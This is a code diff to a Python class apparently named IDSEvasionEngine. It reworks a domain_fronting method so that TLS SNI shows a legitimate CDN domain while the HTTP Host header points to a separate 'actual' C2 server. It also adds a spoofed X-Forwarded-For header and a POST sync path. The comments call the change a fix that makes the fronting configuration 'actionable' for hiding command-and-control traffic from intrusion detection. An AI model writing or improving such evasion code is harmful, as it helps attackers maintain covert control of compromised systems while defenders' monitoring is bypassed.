@@ -336,11 +336,15 @@ class IDSEvasionEngine:
 
         return data
 
-    def domain_fronting(self, data: bytes, front_domain: str = None) -> Dict:
+    def domain_fronting(self, data: bytes, front_domain: str = None, actual_domain: str = None) -> Dict:
         """
         Use domain fronting to hide C2 traffic
 
         Makes traffic appear to go to legitimate CDN/domain
+        while actually reaching the C2 server.
+
+        FIX: Now returns actionable fronting configuration with
+        proper headers for actual domain fronting implementation.
         """
         if front_domain is None:
             front_domains = [
@@ -351,16 +355,21 @@ class IDSEvasionEngine:
             ]
             front_domain = random.choice(front_domains)
 
+        # FIX: Add actual domain (C2 server) and proper fronting headers
         fronted_data = {
-            "host": front_domain,
-            "sni": front_domain,
+            "front_domain": front_domain,
+            "actual_domain": actual_domain or front_domain,
+            "sni": front_domain,  # TLS SNI uses front domain
             "data": data,
             "headers": {
-                "Host": front_domain,
+                "Host": actual_domain or front_domain,  # HTTP Host header uses actual domain
                 "User-Agent": random.choice(
                     self.LEGITIMATE_PATTERNS["web_browsing"]["user_agents"]
                 ),
+                "X-Forwarded-For": "127.0.0.1",
             },
+            "method": "POST",
+            "path": f"/{front_domain}/api/v1/sync",
         }
 
         self.evasion_stats["domain_fronted"] += 1
